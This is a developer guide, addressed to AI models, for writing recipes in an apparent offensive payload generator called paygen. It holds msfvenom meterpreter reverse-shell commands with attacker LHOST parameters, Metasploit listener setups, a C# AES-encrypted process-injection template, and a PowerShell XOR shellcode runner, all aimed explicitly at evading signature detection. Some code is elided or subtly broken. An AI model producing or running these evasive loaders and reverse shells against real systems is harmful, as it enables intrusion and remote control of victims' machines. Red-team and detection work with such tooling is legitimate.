# Paygen Recipe Creation Guide for AI Assistants

This guide provides context and examples for generating paygen recipes, preprocessors, and template files.

---

## Table of Contents

1. [Recipe Structure](#recipe-structure)
2. [Recipe Types](#recipe-types)
3. [Parameter Types](#parameter-types)
4. [Preprocessing](#preprocessing)
5. [Template Files](#template-files)
6. [Preprocessor Scripts](#preprocessor-scripts)
7. [Complete Examples](#complete-examples)
8. [Best Practices](#best-practices)

---

## Recipe Structure

All recipes are YAML files with 4 main sections:

```yaml
meta:           # Metadata about the payload
parameters:     # User-configurable parameters
preprocessing:  # Optional data transformation steps
output:         # How to generate the final payload
```

### Meta Section

```yaml
meta:
  name: "Recipe Name"                    # Display name in TUI
  category: "Category Name"              # Groups recipes (e.g., "Process Injection", "Shellcode Generation")
  description: |                         # Multi-line description
    What this payload does
    How it works
    Any important notes
  
  effectiveness: high|medium|low         # Evasion rating
  
  mitre:                                 # MITRE ATT&CK mappings
    tactic: "TA0XXX - Tactic Name"
    technique: "T1XXX - Technique Name"
  
  artifacts:                             # Observable indicators
    - "Network connection to C2"
    - "File creation in temp directory"
```

### Parameters Section

```yaml
parameters:
  - name: "param_name"
    type: "ip|port|string|path|hex|integer|bool|choice"
    description: "What this parameter does"
    required: true|false
    default: "value"                     # Optional default
    choices: ["opt1", "opt2"]           # For type: choice
    min: 1                               # For type: integer
    max: 65535                           # For type: integer
```

### Output Section

Two types: `template` or `command`

**Template-based:**
```yaml
output:
  type: "template"
  template: "path/to/template.cs"      # Relative to templates_dir
  compile:
    enabled: true
    command: "mcs -out:{{ output_path }}/{{ output_file }} {{ source_file }}"
  launch_instructions: |
    # How to use the payload
```

**Command-based:**
```yaml
output:
  type: "command"
  command: "msfvenom -p windows/x64/... -f exe -o {{ output_path }}/{{ output_file }}"
  launch_instructions: |
    # How to use the payload
```

---

## Recipe Types

### 1. Template-Based Recipes

Use Jinja2 templates for source code generation. Best for:
- Custom C/C++/C# payloads
- PowerShell scripts
- Python scripts
- Any compiled language

**Template file locations:** `templates/category_name/file.ext`

### 2. Command-Based Recipes

Execute external commands (msfvenom, shellcode generators, etc.). Best for:
- Wrapper around existing tools
- Pre-compiled payloads
- Binary transformations

---

## Parameter Types

### `ip`
- Validates IPv4 addresses
- Example: `192.168.1.100`

### `port`
- Validates port numbers (1-65535)
- Example: `4444`

### `string`
- Any text value
- Example: `MyPayload`

### `path`
- File or directory path
- Can use config variables: `{config.output_dir}`
- Example: `/tmp/output`

### `hex`
- Hexadecimal values
- Example: `0xdeadbeef` or `fa12`

### `integer`
- Whole numbers
- Can specify `min` and `max`
- Example: `1024`

### `bool`
- Boolean checkbox
- Values: `true` or `false`

### `choice`
- Dropdown selection
- Requires `choices` array
- Example:
  ```yaml
  - name: "arch"
    type: "choice"
    choices: ["x86", "x64"]
    default: "x64"
  ```

---

## Preprocessing

Chain multiple preprocessing steps to transform data before final output.

### Command Preprocessing

Execute shell commands and capture output:

```yaml
preprocessing:
  - type: "command"
    name: "generate_shellcode"
    command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} -f raw"
    output_var: "shellcode"
```

### Script Preprocessing

Run Python scripts with JSON I/O:

```yaml
preprocessing:
  - type: "script"
    name: "encrypt_shellcode"
    script: "aes_encrypt.py"
    args:
      data: "{{ shellcode }}"
      key_size: 256
    output_var: "encrypted"
```

### Chaining Steps

Each `output_var` becomes available for subsequent steps:

```yaml
preprocessing:
  - type: "command"
    name: "step1"
    command: "generate_data"
    output_var: "raw_data"
  
  - type: "script"
    name: "step2"
    script: "transform.py"
    args:
      data: "{{ raw_data }}"
    output_var: "transformed_data"
  
  - type: "script"
    name: "step3"
    script: "format_csharp.py"
    args:
      data: "{{ transformed_data }}"
    output_var: "formatted_output"
```

---

## Template Files

Templates use Jinja2 syntax with variables from parameters and preprocessing.

### Available Variables

- **Parameters:** `{{ param_name }}`
- **Preprocessing outputs:** `{{ output_var }}`
- **Config paths:** `{{ config.output_dir }}`, `{{ config.templates_dir }}`, etc.
- **Auto-provided:** `{{ source_file }}` (in compile commands), `{{ output_path }}`, `{{ output_file }}`

### Example C# Template

**Note:** Templates should include comments to explain the code. The `remove_comments` build option will automatically strip them during compilation if enabled.

```csharp
// templates/process_injection/injector.cs
using System;
using System.Runtime.InteropServices;

class Injector {
    // AES encrypted shellcode - generated by preprocessing pipeline
    static byte[] encrypted = { {{ encrypted_shellcode }} };
    static byte[] key = { {{ aes_key }} };
    static byte[] iv = { {{ aes_iv }} };
    
    // Windows API imports for process injection
    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    
    static void Main(string[] args) {
        // Decrypt shellcode using AES-256-CBC
        byte[] shellcode = AesDecrypt(encrypted, key, iv);
        
        // Inject into {{ target_process }}
        // Implementation uses classic DLL injection technique
        // ... injection code ...
    }
    
    // AES decryption routine
    // Implements standard AES-256-CBC decryption
    static byte[] AesDecrypt(byte[] data, byte[] key, byte[] iv) {
        // ... decryption implementation ...
    }
}
```

### Example PowerShell Template

```powershell
# templates/powershell/runner.ps1
$ErrorActionPreference = "SilentlyContinue"

# XOR encrypted shellcode
$encrypted = @({{ encrypted_shellcode }})
$key = {{ xor_key }}

# Decrypt
$shellcode = @()
for ($i = 0; $i -lt $encrypted.Length; $i++) {
    $shellcode += $encrypted[$i] -bxor $key
}

# Allocate memory and execute
$ptr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    [System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length),
    [Func[IntPtr]]
)
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $ptr, $shellcode.Length)
$delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [Func[IntPtr]])
$delegate.Invoke()
```

---

## Preprocessor Scripts

Preprocessor scripts communicate via JSON stdin/stdout.

### Input Format

```json
{
  "arg1": "value1",
  "arg2": "value2"
}
```

### Output Format

```json
{
  "output_key": "base64_encoded_data",
  "metadata_key": "additional_info"
}
```

### Example: XOR Encryption

```python
#!/usr/bin/env python3
# preprocessors/xor_encrypt.py
import sys
import json
import base64

def main():
    # Read arguments from stdin
    args = json.load(sys.stdin)
    
    # Get data (base64 encoded) and key
    data = base64.b64decode(args['data'])
    key = int(args.get('key', 0xFA), 16)
    
    # XOR encrypt
    encrypted = bytes([b ^ key for b in data])
    
    # Return results
    output = {
        'encrypted': base64.b64encode(encrypted).decode(),
        'key': hex(key),
        'size': len(encrypted)
    }
    
    print(json.dumps(output))

if __name__ == "__main__":
    main()
```

### Example: Format for C#

```python
#!/usr/bin/env python3
# preprocessors/format_csharp.py
import sys
import json
import base64

def main():
    args = json.load(sys.stdin)
    data = base64.b64decode(args['data'])
    
    # Format as C# byte array
    formatted = ", ".join([f"0x{b:02x}" for b in data])
    
    output = {
        'formatted': formatted,
        'length': len(data)
    }
    
    print(json.dumps(output))

if __name__ == "__main__":
    main()
```

### Built-in Preprocessors

Available in `preprocessors/`:
- `xor_encrypt.py` - XOR encryption with auto-key generation
- `aes_encrypt.py` - AES-256-CBC encryption
- `base64_encode.py` - Base64 encoding
- `compress.py` - Gzip compression
- `format_csharp.py` - Format bytes as C# arrays
- `caesar_cipher.py` - Caesar cipher

---

## Complete Examples

### Example 1: AES-Encrypted Process Injector

**Recipe:** `recipes/aes_process_injection.yaml`

```yaml
meta:
  name: "C# AES-Encrypted Shellcode Injector"
  category: "Process Injection"
  description: |
    Generates encrypted shellcode and injects into a target process.
    Uses AES-256-CBC encryption to evade signature detection.
  effectiveness: high
  mitre:
    tactic: "TA0005 - Defense Evasion"
    technique: "T1055 - Process Injection"
  artifacts:
    - "OpenProcess API calls"
    - "VirtualAllocEx memory allocation"
    - "WriteProcessMemory API calls"

parameters:
  - name: "lhost"
    type: "ip"
    description: "Attacker IP address"
    required: true
  
  - name: "lport"
    type: "port"
    description: "Listener port"
    required: true
    default: 4444
  
  - name: "target_process"
    type: "string"
    description: "Target process name"
    required: true
    default: "explorer.exe"
  
  - name: "output_file"
    type: "string"
    default: "injector.exe"
  
  - name: "output_path"
    type: "path"
    default: "{config.output_dir}"

preprocessing:
  - type: "command"
    name: "generate_shellcode"
    command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} -f raw"
    output_var: "shellcode"
  
  - type: "script"
    name: "aes_encryption"
    script: "aes_encrypt.py"
    args:
      data: "{{ shellcode }}"
    output_var: "encrypted"
  
  - type: "script"
    name: "format_encrypted_payload"
    script: "format_csharp.py"
    args:
      data: "{{ encrypted.encrypted }}"
    output_var: "encrypted_shellcode"
  
  - type: "script"
    name: "format_aes_key"
    script: "format_csharp.py"
    args:
      data: "{{ encrypted.key }}"
    output_var: "aes_key"
  
  - type: "script"
    name: "format_aes_iv"
    script: "format_csharp.py"
    args:
      data: "{{ encrypted.iv }}"
    output_var: "aes_iv"

output:
  type: "template"
  template: "process_injection/aes_injector.cs"
  compile:
    enabled: true
    command: "mcs -out:{{ output_path }}/{{ output_file }} {{ source_file }}"
  launch_instructions: |
    # Step 1: Start Metasploit listener
    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; exploit"
    
    # Step 2: Execute on target
    {{ output_path }}/{{ output_file }} {{ target_process }}
```

### Example 2: Simple Msfvenom Wrapper

**Recipe:** `recipes/basic_msfvenom.yaml`

```yaml
meta:
  name: "Basic Msfvenom Reverse Shell"
  category: "Shellcode Generation"
  description: "Simple msfvenom reverse TCP payload"
  effectiveness: low
  mitre:
    tactic: "TA0002 - Execution"
    technique: "T1059 - Command and Scripting Interpreter"
  artifacts:
    - "Metasploit signatures"
    - "Outbound TCP connection"

parameters:
  - name: "lhost"
    type: "ip"
    required: true
  
  - name: "lport"
    type: "port"
    default: 4444
  
  - name: "output_file"
    type: "string"
    default: "payload.exe"
  
  - name: "output_path"
    type: "path"
    default: "{config.output_dir}"

preprocessing: []

output:
  type: "command"
  command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} -f exe -o {{ output_path }}/{{ output_file }}"
  launch_instructions: |
    # Start listener
    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; exploit"
    
    # Execute payload
    {{ output_path }}/{{ output_file }}
```

---

## Best Practices

### Recipe Design

1. **Use descriptive names** - Make it clear what the payload does
2. **Categorize properly** - Use existing categories or create logical new ones
3. **Document artifacts** - List all observable indicators
4. **MITRE mappings** - Always include tactic and technique
5. **Effectiveness ratings**:
   - `low`: Known signatures, easily detected
   - `medium`: Some obfuscation, moderate evasion
   - `high`: Advanced techniques, strong evasion

### Parameters

1. **Use appropriate types** - Leverage built-in validation
2. **Provide defaults** - Make common use cases one-click
3. **Clear descriptions** - Users should understand without external docs
4. **Required vs optional** - Mark required parameters explicitly

### Preprocessing

1. **Chain logically** - Each step should have a clear purpose
2. **Name descriptively** - `output_var` names should indicate content
3. **Keep steps focused** - One transformation per step
4. **Test independently** - Preprocessors should work standalone

### Templates

1. **Comment generously** - Explain the code well; the build system can strip comments automatically if configured
2. **Use consistent formatting** - Makes generated code readable
3. **Escape properly** - Handle special characters in Jinja2
4. **Test compilation** - Ensure templates render valid code

### Launch Instructions

1. **Step-by-step** - Number steps clearly
2. **Include all commands** - Copy-paste ready
3. **Show alternatives** - Different execution methods
4. **Safety warnings** - Remind about authorized use only

### Testing

Always test recipes before committing:

```bash
# Run from paygen root directory
python -m src.main

# Navigate to recipe and press Ctrl+G
# Fill in parameters
# Verify build completes
# Check output file
# Test launch instructions
```

---

## Common Patterns

### Pattern 1: Shellcode + Encryption + Injection

```
msfvenom → encrypt → format → template → compile
```

### Pattern 2: Multi-stage Loader

```
generate stager → encrypt stager → 
generate stage2 → encrypt stage2 →
combine → template → compile
```

### Pattern 3: Obfuscated Script

```
generate payload → base64 → compress →
xor encrypt → format → template
```

### Pattern 4: Direct Binary Generation

```
command tool → output file
(no preprocessing or templating)
```

---

## Variable Scoping

### Global Variables (always available)

- `{{ lhost }}` (if parameter exists)
- `{{ lport }}` (if parameter exists)
- `{{ output_file }}` (always)
- `{{ output_path }}` (always)
- `{{ config.output_dir }}`
- `{{ config.templates_dir }}`
- `{{ config.recipes_dir }}`
- `{{ config.preprocessors_dir }}`

### Preprocessing Variables

Available after their step completes:
- `{{ output_var_name }}` - Full output (string or dict)
- `{{ output_var_name.key }}` - If output is JSON dict
- `{{ output_var_name.formatted }}` - Common pattern from formatters

### Compilation Variables

Only in `compile.command`:
- `{{ source_file }}` - Path to rendered template

---

## Troubleshooting

### Recipe won't load
- Check YAML syntax (use yamllint)
- Verify all required fields present
- Check parameter types are valid

### Preprocessing fails
- Test preprocessor script independently
- Check JSON input/output format
- Verify base64 encoding for binary data
- Check that previous `output_var` exists

### Template rendering fails
- Verify all variables are defined
- Check Jinja2 syntax
- Escape special characters properly
- Test with simple template first

### Compilation fails
- Check compiler is installed
- Verify command syntax
- Test command manually with rendered code
- Check file permissions

---

## File Locations

```
paygen/
├── recipes/                 # Recipe YAML files
│   ├── category1/
│   └── category2/
├── templates/              # Template source files
│   ├── process_injection/
│   ├── shellcode_injection/
│   └── powershell/
├── preprocessors/          # Python preprocessing scripts
└── output/                # Generated payloads (gitignored)
```

---

## Quick Reference

### Minimal Recipe

```yaml
meta:
  name: "Name"
  category: "Category"
  description: "Description"
  effectiveness: low|medium|high

parameters:
  - name: "param"
    type: "string"
    required: true

output:
  type: "command"
  command: "echo {{ param }}"
```

### Minimal Preprocessor

```python
#!/usr/bin/env python3
import sys, json, base64

args = json.load(sys.stdin)
data = base64.b64decode(args['data'])
# ... process data ...
print(json.dumps({'output': base64.b64encode(result).decode()}))
```

### Minimal Template

```csharp
// Minimal C# template
// Always include comments to explain the code
// The build system can strip them automatically
using System;
class Program {
    static void Main() {
        // Use template variable: {{ parameter_name }}
        // Add implementation here
    }
}
```

---

**Remember:** All payloads are for authorized security testing only. Always include proper warnings and MITRE mappings.
